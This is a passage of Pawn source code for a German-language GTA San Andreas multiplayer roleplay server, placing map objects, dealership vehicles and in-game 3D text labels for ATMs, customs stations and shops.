CreateDynamicObject(18766, 1807.31860, -1293.00281, 12.20727,   -90.00000, 0.00000, -55.32005, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1803.46533, -1296.08655, 12.20727,   -90.00000, 0.00000, -55.32005, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1799.71436, -1298.68384, 12.20727,   -90.00000, 0.00000, -55.32005, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1795.51233, -1301.32080, 12.20727,   -90.00000, 0.00000, -55.32005, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1791.87183, -1302.56409, 12.20727,   -90.00000, 0.00000, -75.24006, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1781.72192, -1299.57642, 12.20727,   -90.00000, 0.00000, -38.76007, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1781.04333, -1300.43127, 14.17050,   0.00000, 0.00000, -67.98002, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1794.69116, -1299.02441, 14.24517,   0.00000, 0.00000, 33.60005, -1, -1, -1, 600.0);
CreateDynamicObject(630, 1779.60229, -1295.22107, 13.63539,   0.00000, 0.00000, 0.00000, -1, -1, -1, 600.0);
CreateDynamicObject(630, 1794.55127, -1285.53906, 13.64200,   0.00000, 0.00000, 0.00000, -1, -1, -1, 600.0);
CreateDynamicObject(630, 1810.18860, -1286.21423, 13.64200,   0.00000, 0.00000, 0.00000, -1, -1, -1, 600.0);
CreateDynamicObject(19273, 1784.14417, -1301.17346, 14.47892,   0.00000, 0.00000, 179.87994, -1, -1, -1, 600.0);
CreateDynamicObject(630, 1813.23389, -1276.34631, 13.64200,   0.00000, 0.00000, 0.00000, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1777.98621, -1296.21753, 11.03193,   0.00000, 0.00000, 51.48002, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1788.29382, -1302.96082, 12.20727,   -90.00000, 0.00000, -1.14007, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1785.08008, -1291.21167, 14.29301,   0.00000, 0.00000, -150.29985, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1781.29871, -1293.36755, 14.28490,   0.00000, 0.00000, 209.70012, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1785.08008, -1291.21167, 17.57860,   0.00000, 0.00000, 209.70001, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1781.29871, -1293.36755, 17.58100,   0.00000, 0.00000, 209.70007, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1778.03271, -1296.14124, 14.28490,   0.00000, 0.00000, 231.48022, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1778.03271, -1296.14124, 17.59212,   0.00000, 0.00000, 231.48015, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1788.65674, -1288.78796, 14.28490,   0.00000, 0.00000, 218.63998, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1788.65674, -1288.78796, 17.58278,   0.00000, 0.00000, 218.64000, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1792.06763, -1286.05957, 14.28490,   0.00000, 0.00000, 218.63995, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1792.06763, -1286.05957, 17.58574,   0.00000, 0.00000, 218.64011, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1795.50317, -1283.32092, 14.28490,   0.00000, 0.00000, 217.80000, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1795.51367, -1283.33789, 17.57822,   0.00000, 0.00000, 217.79999, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1799.06714, -1280.72400, 14.28490,   0.00000, 0.00000, 214.37996, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1799.05688, -1280.74536, 17.54809,   0.00000, 0.00000, 214.38008, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1802.65576, -1278.25330, 14.28490,   0.00000, 0.00000, 214.37994, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1802.66882, -1278.26843, 17.55971,   0.00000, 0.00000, 214.37997, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1806.41101, -1276.05493, 14.29510,   0.00000, 0.00000, 205.92001, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1806.43713, -1276.06567, 17.59550,   0.00000, 0.00000, 205.92007, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1810.52405, -1274.83923, 17.56786,   0.00000, 0.00000, 186.18005, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1810.54578, -1274.84021, 14.28288,   0.00000, 0.00000, 186.18007, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1814.87573, -1274.49731, 17.55906,   0.00000, 0.00000, 182.21986, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1814.87585, -1274.49731, 14.28937,   0.00000, 0.00000, 182.21997, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1780.98718, -1300.14075, 12.84842,   0.00000, -90.50000, -36.18000, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1781.04333, -1300.43127, 14.81883,   0.00000, 0.00000, -67.98002, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1786.98804, -1305.35278, 12.20727,   -90.00000, 0.00000, -1.14007, -1, -1, -1, 600.0);
CreateDynamicObject(630, 1806.30383, -1277.73145, 13.64200,   0.00000, 0.00000, 0.00000, -1, -1, -1, 600.0);
CreateDynamicObject(630, 1801.28418, -1280.60571, 13.64200,   0.00000, 0.00000, 0.00000, -1, -1, -1, 600.0);
CreateDynamicObject(630, 1797.97180, -1282.87842, 13.64200,   0.00000, 0.00000, 0.00000, -1, -1, -1, 600.0);
CreateDynamicObject(630, 1785.93396, -1292.15686, 13.63539,   0.00000, 0.00000, 0.00000, -1, -1, -1, 600.0);


//----------------------------------------------------------------------------------
SendRconCommand("language German / Deutsch");

CreateDynamicObject(2942, -573.22211, -1080.34961, 23.13135,   0.00000, 0.00000, 239.91451);// ATM

//Haustor 2
haustor2 = CreateDynamicObject(980, 282.38562, -1319.93042, 55.41534,   0.00000, 0.00000, 34.92000);
//


CreateDynamicObject(19794, 1787.14038, -1565.66565, 11.95254,   0.00000, 0.00000, 0.00000);


bwtor1 = CreateDynamicObject(19313, 135.10268, 1941.33716, 21.63707,   0.00000, 0.00000, 0.00000);
bwtor2 = CreateDynamicObject(19313, 285.61713, 1822.02710, 19.93185,   0.00000, 0.00000, -90.00002);
haustor = CreateDynamicObject(969, 323.77701, -1186.22131, 75.54530,   0.00000, 0.00000, 218.64000);

CreateDynamicObject(18762, 324.29263, -1185.79089, 77.51872,   0.00000, 0.00000, 38.82000);
CreateDynamicObject(18762, 318.25885, -1190.54639, 77.51872,   0.00000, 0.00000, 38.82000);


CreateDynamicObject(19312, 191.12291, 1870.04651, 21.47489,   0.00000, 0.00000, 0.00000);// Bundeswehr Zaun Base

// Tanke Int
CreateDynamicObject(19876, 666.71271, -565.12640, 17.33450,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19877, 666.48517, -571.17682, 17.32215,   0.00000, 0.00000, 0.00000);

// =============================================  Cars der Autohäuser =============================================
// Intercars 1
	HandelCar[0] = AddStaticVehicleEx(536, 782.74865723, -1351.31652832, 13.39519691, 64.75000000, 1, 1,respawntime);
	HandelCar[1] = AddStaticVehicleEx(467, 770.12451172, -1333.98583984, 13.40533352, 178.74963379, 1, 1,respawntime);
	HandelCar[2] = AddStaticVehicleEx(534, 748.44793701, -1333.71667480, 13.36079884, 181.00000000, 1, 1,respawntime);
	HandelCar[3] = AddStaticVehicleEx(567, 782.59582520, -1356.88867188, 13.51571655, 60.75000000, 1, 1,respawntime);
	HandelCar[4] = AddStaticVehicleEx(535, 783.31323242, -1369.18566895, 13.37768173, 61.50000000, 1, 1,respawntime);
	HandelCar[5] = AddStaticVehicleEx(412, 753.92895508, -1334.22192383, 13.49228287, 180.75000000, 1, 1,respawntime);
	HandelCar[6] = AddStaticVehicleEx(458, 782.92675781, -1339.85510254, 13.37924576, 66.00000000, 1, 1,respawntime);
	HandelCar[7] = AddStaticVehicleEx(479, 782.75946045, -1345.80700684, 13.37924576, 65.25000000, 1, 1,respawntime);
	HandelCar[8] = AddStaticVehicleEx(518, 759.49200439, -1333.71411133, 13.33484840, 180.74981689, 1, 1,respawntime);
	HandelCar[9] = AddStaticVehicleEx(542, 764.77844238, -1333.89453125, 13.38308811, 180.49993896, 1, 1,respawntime);
	HandelCar[10] = AddStaticVehicleEx(496, 783.35833740, -1375.37438965, 13.38228798, 61.00000000, 1, 1,respawntime);
	HandelCar[11] = AddStaticVehicleEx(439, 783.16314697, -1363.00170898, 13.53606319, 61.50000000, 1, 1,respawntime);
	HandelCar[12] = AddStaticVehicleEx(579, 783.05902100, -1334.72534180, 13.63766956, 66.00000000, 1, 1,respawntime);
	HandelCar[13] = AddStaticVehicleEx(507, 762.07525635, -1366.13574219, 13.46346951, 269.50000000, 1, 1,respawntime);
	HandelCar[14] = AddStaticVehicleEx(589, 783.14910889, -1381.06555176, 13.39837551, 58.50000000, 1, 1,respawntime);
	HandelCar[15] = AddStaticVehicleEx(602, 762.75970459, -1372.21459961, 13.51008987, 270.75000000, 1, 1,respawntime);
	HandelCar[16] = AddStaticVehicleEx(400, 762.79504395, -1359.46960449, 13.65827274, 269.50000000, 1, 1,respawntime);
	HandelCar[17] = AddStaticVehicleEx(405, 762.55908203, -1377.90039062, 13.64711571, 269.75000000, 1, 1,respawntime);
	HandelCar[18] = AddStaticVehicleEx(482, 742.61590576, -1333.53088379, 13.43742371, 181.00000000, 1, 1,respawntime);// Burrito
// Wang Cars 3
	HandelCar[19] = AddStaticVehicleEx(550, -1946.80371094, 273.70214844, 35.32170486, 89.74731445, 1, 1,respawntime);
	HandelCar[20] = AddStaticVehicleEx(540, -1946.87109375, 269.25585938, 35.37842178, 90.00000000, 1, 1,respawntime);
	HandelCar[21] = AddStaticVehicleEx(533, -1947.25000000, 264.62109375, 35.21874619, 90.00000000, 1, 1,respawntime);
	HandelCar[22] = AddStaticVehicleEx(565, -1947.60253906, 260.83547974, 35.13568115, 90.00000000, 1, 1,respawntime);
	HandelCar[23] = AddStaticVehicleEx(404, -1954.79638672, 256.70407104, 40.82707977, 0.00000000, 1, 1,respawntime);
	HandelCar[24] = AddStaticVehicleEx(500, -1950.38500977, 256.68618774, 41.14840698, 0.00000000, 1, 1,respawntime);
	HandelCar[25] = AddStaticVehicleEx(508, -1956.69104004, 301.90597534, 35.84374619, 49.00000000, 1, 1,respawntime);
	HandelCar[26] = AddStaticVehicleEx(545, -1955.85412598, 304.37887573, 40.89707565, 117.99993896, 1, 1,respawntime);
	HandelCar[27] = AddStaticVehicleEx(554, -1945.57324219, 256.41513062, 41.14207458, 2.00000000, 1, 1,respawntime);
	HandelCar[28] = AddStaticVehicleEx(561, -1952.21142578, 296.90676880, 40.92107773, 0.50000000, 1, 1,respawntime);
	HandelCar[29] = AddStaticVehicleEx(489, -1945.70129395, 273.26300049, 41.21352768, 179.75000000, 1, 1,respawntime);
	HandelCar[30] = AddStaticVehicleEx(587, -1957.13378906, 255.03564453, 35.27875137, 270.25000000, 1, 1,respawntime);
	HandelCar[31] = AddStaticVehicleEx(527, -1947.04077148, 257.21127319, 35.22689819, 90.00000000, 1, 1,respawntime);
// Airport LS 4
	HandelCar[32] = AddStaticVehicleEx(519,1888.1676,-2624.6411,14.4657,0.8012,1,1,respawntime); //
	HandelCar[33] = AddStaticVehicleEx(487,1816.7236,-2626.7029,13.7474,0.0006,1,1,respawntime); //
	HandelCar[34] = AddStaticVehicleEx(593,1754.5947,-2630.0454,14.0137,0.0000,1,1,respawntime); //
// Rastplatz 5
	HandelCar[35] = AddStaticVehicleEx(424,-583.0847,-1069.8365,23.1808,235.3773,1,1,respawntime); //
	HandelCar[36] = AddStaticVehicleEx(483,-579.2244,-1063.7776,23.4843,235.4630,1,1,respawntime); //
	HandelCar[37] = AddStaticVehicleEx(502,-575.5968,-1057.3594,23.5410,235.1344,1,1,respawntime); //
	HandelCar[38] = AddStaticVehicleEx(503,-571.5926,-1051.2943,23.6935,235.4366,1,1,respawntime); //
	HandelCar[39] = AddStaticVehicleEx(568,-567.9077,-1044.8668,23.8065,235.5502,1,1,respawntime); //
	HandelCar[40] = AddStaticVehicleEx(578,-562.1791,-1040.1111,24.6688,235.1449,1,1,respawntime); //
	HandelCar[41] = AddStaticVehicleEx(531,-595.4899,-1088.2561,23.6267,236.5912,1,1,respawntime); //
	HandelCar[42] = AddStaticVehicleEx(478,-591.2525,-1081.9945,23.5356,238.3232,1,1,respawntime); //
	HandelCar[43] = AddStaticVehicleEx(495,-587.7305,-1075.5167,23.7851,236.7943,1,1,respawntime); //





// Bikes LS
	HandelCar[44] = AddStaticVehicleEx(581,2118.9380,-1130.4630,24.8937,270.8289,1,1,respawntime); //
	HandelCar[45] = AddStaticVehicleEx(586,2118.7737,-1133.3031,24.7882,264.1263,1,1,respawntime); //
	HandelCar[46] = AddStaticVehicleEx(468,2118.4688,-1136.0300,24.8493,266.2497,1,1,respawntime); //
	HandelCar[47] = AddStaticVehicleEx(471,2118.0425,-1138.4633,24.5767,261.8998,1,1,respawntime); //
	HandelCar[48] = AddStaticVehicleEx(521,2136.3564,-1139.5646,24.9619,95.9575,1,1,respawntime); //
	HandelCar[49] = AddStaticVehicleEx(481,2136.5830,-1137.6146,25.1298,94.5266,1,1,respawntime); //
	HandelCar[50] = AddStaticVehicleEx(463,2136.8506,-1135.2499,25.2446,91.6594,1,1,respawntime); //
	HandelCar[51] = AddStaticVehicleEx(461,2136.7754,-1132.7695,25.2740,97.5105,1,1,respawntime); //
	HandelCar[52] = AddStaticVehicleEx(462,2136.8687,-1130.1548,25.2583,94.3072,1,1,respawntime); //
// SF 2
	HandelCar[53] = AddStaticVehicleEx(549,-1664.1211,1223.1898,20.8555,226.3136,1,1,respawntime); //
	HandelCar[54] = AddStaticVehicleEx(555,-1659.9475,1216.3535,20.8009,0.0579,1,1,respawntime); //
	HandelCar[55] = AddStaticVehicleEx(546,-1648.3910,1206.2070,20.8772,73.1228,1,1,respawntime); //
	HandelCar[56] = AddStaticVehicleEx(585,-1665.5120,1206.9954,20.7453,285.9771,1,1,respawntime); //
	HandelCar[57] = AddStaticVehicleEx(516,-1674.1647,1206.9419,13.5065,248.1059,1,1,respawntime); //
	HandelCar[58] = AddStaticVehicleEx(547,-1658.3788,1215.7528,13.4175,7.6629,1,1,respawntime); //
	HandelCar[59] = AddStaticVehicleEx(543,-1664.3733,1223.5310,13.4993,200.0881,1,1,respawntime); //
	HandelCar[60] = AddStaticVehicleEx(517,-1647.8788,1206.9844,13.5280,45.3566,1,1,respawntime); //
// Boote
	HandelCar[61] = AddStaticVehicleEx(493,791.7990,-1907.4666,-0.1888,179.7851,1,1,respawntime); //
	HandelCar[62] = AddStaticVehicleEx(472,785.4958,-1909.0364,0.1513,177.6176,1,1,respawntime); //
	HandelCar[63] = AddStaticVehicleEx(473,779.9835,-1907.8333,-0.1709,181.0683,1,1,respawntime); //
	HandelCar[64] = AddStaticVehicleEx(454,772.3346,-1909.8829,0.1667,181.0320,1,1,respawntime); //
	HandelCar[65] = AddStaticVehicleEx(452,762.9132,-1911.2576,-0.4428,175.0400,1,1,respawntime); //
	HandelCar[66] = AddStaticVehicleEx(453,753.7708,-1910.9385,-0.2891,181.3652,1,1,respawntime); //



// Grottis LS Luxus 2
	ShowCarEdel[1] = AddStaticVehicleEx(409,558.5714,-1290.0800,17.0482,0.7796,1,1,respawntime); //
	ShowCarEdel[2] = AddStaticVehicleEx(429,563.3094,-1288.9951,16.9551,4.4241,1,1,respawntime); //
	ShowCarEdel[3] = AddStaticVehicleEx(411,553.5678,-1289.6132,16.9738,4.0359,1,1,respawntime); //
	ShowCarEdel[4] = AddStaticVehicleEx(415,548.6343,-1289.2463,16.9926,6.1364,1,1,respawntime); //
	ShowCarEdel[5] = AddStaticVehicleEx(451,542.7263,-1289.3337,16.9615,3.7361,1,1,respawntime); //
	ShowCarEdel[6] = AddStaticVehicleEx(541,537.7314,-1289.6447,16.8341,0.1859,1,1,respawntime); //
	ShowCarEdel[7] = AddStaticVehicleEx(559,532.4512,-1290.0410,16.9189,2.2322,1,1,respawntime); //
	ShowCarEdel[8] = AddStaticVehicleEx(560,527.2747,-1290.7939,16.9019,1.4227,1,1,respawntime); //
	ShowCarEdel[9] = AddStaticVehicleEx(506,522.9924,-1290.4208,16.9316,3.1240,1,1,respawntime); //
	ShowCarEdel[10] = AddStaticVehicleEx(522,567.2929,-1289.0367,16.8184,7.2474,1,1,respawntime); //

//------------------------------------------------------------------------------------------------------


	Fight_Init();
	START_FRAC();
	ResetElevatorQueue();
	Elevator_Initialize();
//	SetWeather(-77);
	noooc = 0;
	SetNameTagDrawDistance(50.0);
    ManualVehicleEngineAndLights();

//=========== TEXT LABELS =============//
	new string3[200];
	format(string3, sizeof(string3), "[Transportverkauf]\nPreis pro Paket: 5000$\nPakete auf Lager: %d\nKaufen mit /petrol", LSAWaren);
	LSWText = Create3DTextLabel(string3, 0xFFFFFFFF, -1280.7585,2719.8538,50.0625, 40.0, 0, 1);
//LSPD
//	Create3DTextLabel("/Kaufen\num den Waffenschein zu erwerben\nPreis: 10.000$", COLOR_YELLOW, 252.4243,111.7874,1003.2188,9.0,0);




	Create3DTextLabel("Anwalt\n/Free um jemand Freizulassen", COLOR_YELLOW, 256.8279,69.4461,1003.6406,9.0,0);
	Create3DTextLabel("Anwalt\n/Free um jemand Freizulassen", COLOR_YELLOW, 246.5717,118.1915,1003.2188,9.0,0);




	Create3DTextLabel("/Klingeln\num beraten zu werden", COLOR_YELLOW, 240.9979,112.8959,1003.2188,9.0,0);





//    Create3DTextLabel("Organisationen\nTippe /orgcreate (Name)", COLOR_LIGHTBLUE, 358.9532,182.6575,1008.3828,17.0,0);

    Create3DTextLabel("GTA-City Reallife Stadthalle. /stadthalle", COLOR_YELLOW, 363.3297,173.7336,1008.3828,9.0,0);



	Create3DTextLabel("Du willst dein Auto Freikaufen ?\n/freecar\nKosten: 15.000$", 0x00FFFFFF, 925.9141,-1208.2228,17.0104, 30.0,0);

//Create3DTextLabel(" Anwalt - /Erlaubnis um eine Erlaubnis zu bekommen !", COLOR_YELLOW, 222.2276,121.3832,999.0217,9.0,0);


Create3DTextLabel("{ffffff}Tippe für dem Führerschein /fahrschein -1000$", COLOR_LIGHTBLUE, 1369.5651,-1647.7888,13.3828,9.0,0);

//Create3DTextLabel("{84ff00}Fahrradverleih{ffffff}\nSpieler unter Level 4 können\nhier für 300$ ein Fahrrad mieten.\n{84ff00}/fahrrad", COLOR_LIGHTBLUE, 1771.5807,-1895.8499,13.5545,9.0,0);



//    Create3DTextLabel("/bankrob um die Bank auszurauben!", COLOR_RED, 2155.1436,1623.8749,993.6882,15.0,0);
//	Create3DTextLabel("Exit um den Tresorraum zu Verlassen!", COLOR_RED, 2144.1050,1608.3209,993.6882,15.0,0);
//========
//Hitman Skin
//Create3DTextLabel("/hskin um den Skin zu wächseln",COLOR_WHITE, 2149.6309,-1805.6676,16.1474,8.0,0);


// ATM
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 1417.6274,-981.1376,1639.7843,10.0,0);//ATMBank
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 1421.1991,-981.1116,1639.7843,10.0,0);//ATMBank
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 1424.5581,-981.1905,1639.7843,10.0,0);//ATMBank
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 810.565063, -1623.768799, 13.189775,10.0,0);//atm1
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, -2036.2128, -101.1703, 35.1641,10.0,0);//atm1
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 1000.825195, -922.610168, 41.971024,10.0,0);//atm2
//	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 1552.2200, -1667.2983, 13.5590,10.0,0);//atm3
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 1928.620850, -1771.269043, 13.189775,10.0,0);//atm4
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 926.909912, -1355.081421, 13.021199,10.0,0);//atm5
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 491.439484, -1734.586548, 10.871187,10.0,0);//atm6
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 380.780701, -2021.725830, 7.478837,10.0,0);//atm7
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 1223.778320, -1744.292603, 13.240016,10.0,0);//atm 8
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 2105.436035, -1809.228516, 13.197587,10.0,0);//atm 9
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 2072.053955, -1836.951416, 13.197434,10.0,0);//atm 10
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 1956.735596, -2186.291016, 13.189775,10.0,0);//atm 11
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 2394.498047, -1914.865356, 13.189775,10.0,0);//atm 12
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 2779.040283, -1821.910034, 10.157268,10.0,0);//atm 13
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 1197.3029, -904.9226, 43.1431,10.0,0);//atm 14
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 1837.208618, -1421.554077, 13.180400,10.0,0);//atm 15
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 1033.933228, -1339.474243, 13.344462,10.0,0);//atm 16
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, -1542.506592, -439.954376, 5.617899,10.0,0);//atm 17
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, -1967.163086, 278.601196, 34.784546,10.0,0);//atm 16
//	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, -1648.825928, 1202.475342, 6.842899,10.0,0);//atm 18
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, -2627.958740, 1410.379517, 6.686649,10.0,0);//atm 19
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, -2725.872070, 2369.266602, 71.472687,10.0,0);//atm 20
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 1712.591553, 1617.526855, 9.625760,10.0,0);//atm 21
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 2023.364868, 997.874023, 10.438212,10.0,0);//atm 22
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 2282.881348, 2432.390381, 10.363214,10.0,0);//atm 23
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 2088.521484, 1510.274780, 10.438212,10.0,0);//atm 24
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 846.862244, -1803.118652, 13.229680,10.0,0);//atm 25
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 1458.4338, 2767.5984, 10.8203,10.0,0);//atm 26
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 1089.1029,-1802.9534,13.6026,10.0,0);//atm 27
//	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF, 1464.4210,-1022.8027,23.8331,10.0,0);
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF,-1951.0634,299.9731,35.4688, 10.0,0);
//    Create3DTextLabel("/equip um sich Auszurüsten",COLOR_WHITE, -510.2045,-505.2142,25.5234,8.0,0);

	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF,1505.3557,-1706.5513,14.0469, 10.0,0);
	Create3DTextLabel("ATM \n mit EINGABE Das Menü aufrufen \n Oder benutze /atm", 0x00FFFFFF,-573.7900,-1080.0065,23.5203, 10.0,0);


//	Create3DTextLabel("Hier kannst du Fraktions-Materialien kaufen.\nDiese werden für Waffen aus der Fraktionskammer benötigt.\nKosten: 10$ pro Material\nDu kannst maximal 500 Fraktions-Materialien tragen\n/frakmats", 0xFFFFFFFF , 2805.0444,-1434.0425,40.0484, 30.0, 0, 0);


	Create3DTextLabel("Hier kannst du dein Privatfahrzeug umfärben\nKosten: 5000$\nBefehl: /farbe", 0xFFFFFFFF, 1041.7180,2131.5728,10.8203, 15.0,0);
	Create3DTextLabel("Hier kannst du dein Privatfahrzeug umfärben\nKosten: 5000$\nBefehl: /farbe", 0xFFFFFFFF, 1911.2693,-1776.6720,13.3828, 15.0,0);
	Create3DTextLabel("Hier kannst du dein Privatfahrzeug umfärben\nKosten: 5000$\nBefehl: /farbe", 0xFFFFFFFF, 1017.9830,-919.3538,42.3359, 15.0,0);
//	Create3DTextLabel("Werbestand\nTippe /ad, um eine Werbung zu schreiben", 0xFFFFFFFF , 1207.2928,-917.7825,43.0665,15.0,0);
	Create3DTextLabel("LCM Base", 0xFFFFFFFF, 1701.3274,-1667.7771,20.2188,15.0,0);
	Create3DTextLabel("LCM Base", 0xFFFFFFFF, 2173.3035,1403.3943,11.0625,15.0,0);
	Create3DTextLabel("Kampfstyles kaufen mit /kampfstyles\nPreis pro Kampfstyle: 5.000$", 0xFFFFFFFF, 773.6705,3.1167,1000.7171, 30.0, 0,0);
	Create3DTextLabel("San Andreas Airport Tankstelle\nFür Autos + Flugzeuge + Helikopter\nUmfärben von Privatfahrzeugen mit /farbe", 0xFFFFFFFF, 2002.8409,-2382.0603,13.5469, 40.0, 0, 0);
	Create3DTextLabel("BSS - Drive In\nBestellen mit /drivein.", 0xFFFFFFFF, 799.1068,-1629.4493,12.9548, 40.0, 0, 0);
	Create3DTextLabel("BSN - Drive In\nBestellen mit /drivein.", 0xFFFFFFFF, 1214.4454,-904.4616,43.9208, 40.0, 0, 0);
//	Create3DTextLabel("Handyladen Los Santos\nUm das Menü aufzurufen, tippe /handyladen ein.", 0xFFFFFFFF, -2237.0981,130.4937,1036.4141, 40.0, 0, 1);
	Create3DTextLabel("Waren tauschen\n/waren", 0xFFFFFFFF,-1233.6982,-88.1554,14.9228,50.0, 0);
	Create3DTextLabel("Waren verkaufen\n/waren", 0xFFFFFFFF, 1346.5087,1712.4694,11.8203,50.0, 0);
	Create3DTextLabel("LSPD Garagen Fahrstuhl\nHineingehen\num zum Knast zu kommen",0xFFFFFFFF,1524.9729,-1677.8905,5.8906,5.0,0);
	//========= ZOLL TEXT LABEL ==========//



	Create3DTextLabel("Zollstation LS - LV\nUm passieren zu können, gib an der Schranke /ZOLL ein.",0xFAFAFAFF,1724.7303,524.0016,28.1239,32.0,0);
	Create3DTextLabel("Zollstation LS - LV\nUm passieren zu können, gib an der Schranke /ZOLL ein.",0xFAFAFAFF,1733.1140,520.7195,28.1508,32.0,0);
	Create3DTextLabel("Zollstation LS - LV\nUm passieren zu können, gib an der Schranke /ZOLL ein.",0xFAFAFAFF,1741.8831,517.7935,28.1404,32.0,0);
	Create3DTextLabel("Zollstation LS - LV\nUm passieren zu können, gib an der Schranke /ZOLL ein.",0xFAFAFAFF,1750.2582,515.1455,28.1387,32.0,0);
	Create3DTextLabel("Zollstation LS - SF\nUm passieren zu können, gib an der Schranke /ZOLL ein.",0xFAFAFAFF,58.7423,-1540.1853,5.0891,32.0,0);
	Create3DTextLabel("Zollstation LS - SF\nUm passieren zu können, gib an der Schranke /ZOLL ein.",0xFAFAFAFF,48.8990,-1523.8472,5.0873,32.0,0);
	Create3DTextLabel("Zollstation SF - LV\nUm passieren zu können, gib an der Schranke /ZOLL ein.",0xFAFAFAFF,-1402.2538,830.7063,47.4624,32.0,0);
	Create3DTextLabel("Zollstation SF - LV\nUm passieren zu können, gib an der Schranke /ZOLL ein.",0xFAFAFAFF,-1395.4486,824.6559,47.4641,32.0,0);

	Create3DTextLabel("Zollstation LS - SF\nUm passieren zu können, gib an der Schranke /ZOLL ein.",0xFAFAFAFF,86.22680, -1251.81213, 14.27388,32.0,0);
	Create3DTextLabel("Zollstation SF - LS\nUm passieren zu können, gib an der Schranke /ZOLL ein.",0xFAFAFAFF,96.14687, -1255.90833, 14.34753,32.0,0);
